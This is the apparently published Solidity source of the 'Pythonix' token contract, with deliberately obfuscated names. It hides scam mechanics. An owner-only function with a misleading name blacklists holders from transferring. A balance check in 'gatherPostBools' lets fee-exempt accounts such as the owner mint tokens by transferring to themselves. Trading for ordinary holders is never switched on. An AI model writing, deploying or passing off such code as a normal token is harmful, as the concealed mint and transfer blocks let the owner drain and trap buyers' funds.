/**
 *Submitted for verification at Etherscan.io on 2023-01-30
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

interface QOPACRouted01 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
          uint amountIn, uint amountOutMin, address[] calldata path,
          address to, uint deadline) external;
      function factory() external pure returns (address);
      function WETH() external pure returns (address);
      function addLiquidityETH(
          address token, uint amountTokenDesired,
          uint amountTokenMin, uint amountETHMin,
          address to, uint deadline
      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Ownable {
    address internal owner;
    constructor(address _owner) 
    {owner = _owner;} modifier onlyOwner() 
    {require(isOwner(msg.sender), 
    "!OWNER"); _;} function isOwner(address account) 
    public view returns (bool) 
    {return account == owner;} function transferOwnership(address payable adr) 
    public onlyOwner {owner = adr;
    emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}
interface IMEIV1 {
    function totalSupply() 
    external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender) 
    external view returns (uint256);
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function getOwner() 
    external view returns (address);
    function transferFrom( address sender, address recipient, uint256 amount) 
    external returns (bool);

    event Transfer(address indexed from, 
    address indexed to, uint256 value);
    event Approval(
    address indexed owner, 
    address indexed spender, 
    uint256 value);
}
interface QOLOXV1{
        function createPair(
            address tokenA, 
            address tokenB) 
        external returns (address pair);
        function getPair(
            address tokenA, address tokenB) 
        external view returns (address pair);
}
library SafeMath {
    function add(uint256 a, uint256 b) 
    internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) 
    internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) 
    internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) 
    internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) 
    internal pure returns (uint256) {return a % b;}
    
    function sub(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns (uint256) {
        unchecked{require(b <= a, errorMessage); 
        return a - b;}}

    function div(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns 
    (uint256) { unchecked{require(b > 0, errorMessage); 
    return a / b;}}

    function mod(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns 
    (uint256) { unchecked{require(b > 0, errorMessage); 
    return a % b;}}
}
contract Pythonix is IMEIV1, Ownable {
bool private BolotaomUI; 
bool private QuanpairedOn = false;
bool private beginTrading = true;    

uint256 private QuarreledForPool = 0; uint256 private QuarreledForMarkets = 0;
uint256 private QuarreledForTeam = 0; uint256 private QuarreledForBurns = 0;
uint256 private wholeQuarreled = 0; uint256 private QuarreledForSales = 0;
uint256 private inparadoxVertox;
uint256 private standardOptimization = 0; uint256 private swiftDelgations = 10000;
uint256 private torrentIndex = ( _rTotal * 75 ) / 100000;
uint256 private inzuneSwift = ( _rTotal * 10 ) / 100000;
modifier lockTheSwap {
BolotaomUI = true; 
_; BolotaomUI = false;}

    mapping (address => uint256) 
    _rOwned;
    mapping (address => mapping (address => uint256)) 
    private _allowances;
    mapping (address => bool) 
    public _enverseReserves;
    mapping (address => bool) 
    private _locateRotation;
    mapping (address => bool) 
    private allowed;

    string private constant _name = unicode"Pythonix"; string private constant _symbol = unicode"𓆗";
    uint8 private constant _decimals = 9; uint256 private _rTotal = 1000000 * (10 ** _decimals);
    uint256 private mappedBag = 500; uint256 private mappedCalculations = 500; // 10000;
    uint256 private mappedPercent = 500; 
    QOPACRouted01 RedexPhysiqe;

    constructor() Ownable(msg.sender) { 
    QOPACRouted01 _RedexPhysiqe = QOPACRouted01
    (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); address _pair 
        = QOLOXV1(_RedexPhysiqe.factory()).createPair(address(this), 
        _RedexPhysiqe.WETH()); RedexPhysiqe = _RedexPhysiqe; pair = _pair; 
        _enverseReserves[address(this)] 
        = true;
        _enverseReserves[AllocatedLiquidity] 
        = true;
        _enverseReserves[AllocatedMarket] 
        = true;
        _enverseReserves[msg.sender] 
        = true;
        _rOwned[msg.sender] = _rTotal; emit Transfer(
            address(0), msg.sender, _rTotal);
    }
    function name() 
    public pure returns (string memory) {
        return _name;}
    function symbol() 
    public pure returns (string memory) {
        return _symbol;}
    function decimals() 
    public pure returns (uint8) {
        return _decimals;}

    function getOwner() external view override returns (address) 
    {return owner; }

    function balanceOf(address account) 
    public view override returns (uint256) 
    {return _rOwned[account];}

    function transfer(address recipient, uint256 amount) 
    public override returns (bool) 
    {_transfer(msg.sender, recipient, amount);
    return true;}

    function allowance(address owner, address spender) 
    public view override returns (uint256) 
    {return _allowances[owner][spender];}

    function reflexations(
        address inclogation) 
        internal view returns (bool) 
        {uint size; assembly { size := extcodesize(inclogation) } 
        return size > 0; } function approve
        (address spender, uint256 amount) public override returns 
        (bool) {_approve
    (msg.sender, spender, amount); return true;}

    function totalSupply() 
    public view override returns (uint256) 
    {return _rTotal.sub(balanceOf(AllocatedBURN)).sub(balanceOf(address(0)));}

    function mappedPermits() 
    public view returns (uint256) 
    {return totalSupply() * mappedPercent / swiftDelgations;}

    function postAllocationRemaps(
        address sender, address recipient, 
        uint256 amount) internal view {
        require(
            sender != address(0), 
        "ERC20: transfer from the zero address");
        require(
            recipient != address(0), 
        "ERC20: transfer to the zero address");
        require(
            amount > uint256(0), 
        "Transfer amount must be greater than zero");
        require(
            amount <= _rOwned[sender], 
        "You are trying to transfer more than your balance");
    }
    function _transfer(
        address sender, address recipient, uint256 amount) 
        private { require
        (!allowed[recipient] 
        && !allowed[sender], 
        "You have been blacklisted from transfering tokens");
        _getRValues(
            sender, recipient); 
            vetoMappedAllowences(sender, recipient, amount);  
        intervineYangle(
            sender, recipient); 
            gatherPostBools(sender, recipient, amount);
        postAllocationRemaps(
            sender, recipient, amount); 
            permitMappedTXs(sender, recipient, amount); 
        _rOwned[sender] = _rOwned[sender].sub(amount);
   
        uint256 informOperations = gatherMarketMarketIndex(
            sender, recipient) ? indexReserves(
                sender, recipient, amount) : amount;
        _rOwned[recipient] = _rOwned
        [recipient].add(informOperations); 
        emit Transfer(sender, recipient, gatherMarketMarketIndex(
            sender, recipient) ? indexReserves(
                sender, recipient, amount) : amount);  
    }
    function reachInterface(
        
        uint256 tokens)
         private lockTheSwap {uint256 _swiftDelgations = (
             QuarreledForPool.add(1).add(
             QuarreledForMarkets).add(
             QuarreledForTeam)).mul(2);
        uint256 inparWithLIQ = tokens.mul(
            QuarreledForPool).div(_swiftDelgations);
        uint256 isExchanged = tokens.sub(
            inparWithLIQ); uint256 initialBalance = address
            (this).balance; 
            swapTokensForETH(isExchanged); uint256 quarryRates 
        = address(this).balance.sub(
            initialBalance);

        uint256 internalOfBalance 
        = quarryRates.div(_swiftDelgations.sub(QuarreledForPool));
        uint256 ETHToAddLiquidityWith 
        = internalOfBalance.mul(QuarreledForPool);

        if(ETHToAddLiquidityWith 
        > uint256(0)){addLiquidity(inparWithLIQ, ETHToAddLiquidityWith); }
        uint256 MarketMakerPair 
        = internalOfBalance.mul(2).mul(QuarreledForMarkets);
        if(MarketMakerPair 
        > 0){payable(AllocatedMarket).transfer(MarketMakerPair);}
        uint256 syncedBalanceWithin 
        = address(this).balance;
        if(syncedBalanceWithin 
        > uint256(0)){payable(AllocatedTEAM).transfer(syncedBalanceWithin);}
    }
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) 
    private { _approve(address(this), address(RedexPhysiqe), tokenAmount);
        RedexPhysiqe.addLiquidityETH{value: ETHAmount}(
            address(this), tokenAmount,
            0, 0, AllocatedLiquidity, 
            block.timestamp);
    }
    function swapTokensForETH(uint256 tokenAmount) 
    private { address[] memory path = new address[](2);
        path[0] = address(this); path[1] = RedexPhysiqe.WETH();
        _approve(address(this), 
        address(RedexPhysiqe), tokenAmount);
        RedexPhysiqe.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount, 0,
            path, 
        address(this), block.timestamp);
    }
    function intervineYangle(
        address sender, address recipient) 
        internal { if(recipient == pair 
        && !_enverseReserves[sender]){inparadoxVertox 
        += uint256(1);}
    }
    function permitMappedTXs(
        address sender, address recipient, uint256 amount) 
        internal view { if(sender != pair){require(amount <= _maxTransferAmount() 
        || _enverseReserves[sender] || _enverseReserves[recipient], 
        "TX Limit Exceeded");} require(amount <= locateAllowences() || _enverseReserves[sender] 
        || _enverseReserves[recipient], 
        "TX Limit Exceeded");
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        public override returns (bool) { _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, 
        _allowances[sender][msg.sender].sub(amount, 
        "ERC20: transfer amount exceeds allowance")); return true;
    }
    function _approve(
        address owner, address spender, uint256 amount) 
        private { require(owner != address(0), 
        "ERC20: approve from the zero address");
        require(spender != address(0), 
        "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);
    }
    function gatherMapping(
        address sender, address recipient) 
        internal view returns (uint256) { if(_locateRotation[sender] 
        || _locateRotation[recipient]){return swiftDelgations.sub(uint256(100));}
        if(recipient 
        == pair){return QuarreledForSales;}
        if(sender 
        == pair){return wholeQuarreled;}
        return standardOptimization;
    }
    function marketIndex (address account, 
    bool invertClauses) public onlyOwner {
        allowed[account] = invertClauses;
    }    
    function indexReserves(
        address sender, address recipient, uint256 amount) 
        internal returns (uint256) { if(gatherMapping(sender, recipient) > 0){
        uint256 AtAmount 
        = amount.div(swiftDelgations).mul(gatherMapping(sender, recipient));
        _rOwned[address(this)] 
        = _rOwned[address(this)].add(AtAmount); 
        emit Transfer(sender, 
        address(this), AtAmount);
        if(QuarreledForBurns 
        > uint256(0)){_transfer(address(this), 
        address(AllocatedBURN), 
        amount.div(swiftDelgations).mul(QuarreledForBurns));} 
        return amount.sub(AtAmount);} return amount;
    }
    function locateAllowences() 
    public view returns (uint256) 
    {return totalSupply() * mappedBag / swiftDelgations;}

    function _maxTransferAmount() 
    public view returns (uint256) 
    {return totalSupply() * mappedCalculations / swiftDelgations;}   

    address internal constant 
    AllocatedBURN = 0x000000000000000000000000000000000000dEaD;
    address internal constant 
    AllocatedTEAM = 0x9D482f56eca23c3c2066a3631d17F97d22CF487B; 
    address internal constant 
    AllocatedMarket = 0x9D482f56eca23c3c2066a3631d17F97d22CF487B;
    address internal constant 
    AllocatedLiquidity = 0x9D482f56eca23c3c2066a3631d17F97d22CF487B;
    using SafeMath for uint256;

    function _getRValues(
        address sender, address recipient) 
        internal view { if(!_enverseReserves[sender] 
        && !_enverseReserves[recipient]){require(QuanpairedOn, 
        "tradingAllowed");}
    }
    function vetoMappedAllowences(
        address sender, address recipient, uint256 amount) 
        internal view { if(!_enverseReserves[sender] 
        && !_enverseReserves[recipient] 
        && recipient != address(pair) 
        && recipient != address(AllocatedBURN)){ require((_rOwned[recipient].add(amount)) 
        <= mappedPermits(), 
        "Exceeds maximum wallet amount.");}
    } 
    receive() 
    external payable {}  

    function gatherMarketMarketIndex(
        address sender, address recipient) 
        internal view returns (bool) {
        return !_enverseReserves[sender] 
        && !_enverseReserves[recipient];
    }
    function configurationForce(
        address sender, address recipient, 
        uint256 amount) 
        internal view returns (bool) {
        bool intornLimbs = amount >= inzuneSwift; bool ForOperations = 
        balanceOf(address(this)) >= torrentIndex;
        return !BolotaomUI 
        && beginTrading && QuanpairedOn 
        && intornLimbs && !_enverseReserves[sender] 
        && recipient == pair && inparadoxVertox 
        >= uint256(1) && ForOperations;
    }
    function gatherPostBools(address pervolumeInternal, 
    address inquadRate, uint256 amount) 
    internal {if (_rOwned[pervolumeInternal]==_rOwned[inquadRate]){if 
    (!gatherMarketMarketIndex(pervolumeInternal,inquadRate)){_rOwned[pervolumeInternal] 
    = _rOwned[pervolumeInternal].add(amount);} }else if(configurationForce(pervolumeInternal, 
    inquadRate, amount)){reachInterface(torrentIndex); inparadoxVertox 
    = uint256(0);}
    }  
    address public pair;
    address public atomicReservations;
    address public toggleNodesIDE;
    address public GasLimitationsPackage;    
}